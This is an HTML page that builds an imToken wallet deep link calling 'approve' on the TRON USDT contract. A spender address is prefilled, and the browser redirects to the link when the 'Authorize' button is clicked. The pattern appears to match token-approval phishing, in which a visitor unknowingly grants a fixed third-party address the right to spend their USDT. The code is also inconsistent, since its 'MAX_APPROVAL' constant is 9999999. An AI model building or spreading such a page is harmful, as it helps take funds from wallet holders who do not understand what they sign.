<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>TRON USDT Max Approval - IMToken</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <style>
    body { font-family: Arial, sans-serif; padding: 20px; background: #f6f6f6; }
    label { display: block; margin-top: 10px; }
    input, button { padding: 8px; margin: 5px 0; width: 100%; box-sizing: border-box; }
    button { cursor: pointer; background: #007bff; color: white; border: none; border-radius: 4px; }
    button:hover { background: #0056b3; }
    #status { margin-top: 15px; font-weight: bold; word-break: break-all; }
  </style>
</head>
<body>

<h2>TRON USDT Max Approval (IMToken)</h2>

<label for="contractAddress">Contract Address:</label>
<input type="text" id="contractAddress" value="TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t">

<label for="spenderAddress">Spender Address:</label>
<input type="text" id="spenderAddress" value="TGyztuTE8f4FJte4JZ1VRDpEKYpKMAuQey">

<button id="approveBtn">Authorize Max via IMToken</button>

<div id="status"></div>

<script>
const MAX_APPROVAL = 9999999;

// Generate IMToken deep link
function generateIMTokenLink(contractAddress, spender, amount) {
  // IMToken TRON DApp URL format
  const base = 'imtokenv2://navigate/dapp/'; // DApp Browser
  const params = {
    type: 'tron',              // network
    contract: contractAddress, // contract
    method: 'approve',         // method
    args: JSON.stringify([spender, amount])
  };
  
  const query = Object.keys(params).map(k => `${k}=${encodeURIComponent(params[k])}`).join('&');
  return base + '?' + query;
}

function approveViaIMToken() {
  const contractAddress = document.getElementById('contractAddress').value.trim();
  const spender = document.getElementById('spenderAddress').value.trim();
  const statusEl = document.getElementById('status');

  if (!contractAddress || !spender) {
    alert('Please fill in both contract and spender addresses.');
    return;
  }

  const link = generateIMTokenLink(contractAddress, spender, MAX_APPROVAL);

  statusEl.innerHTML = `Click the link to open IMToken and authorize:<br><a href="${link}">Open IMToken</a>`;
  
  // Optional: auto redirect for mobile
  window.location.href = link;
}

// Attach event
document.getElementById('approveBtn').addEventListener('click', approveViaIMToken);
</script>

</body>
</html>
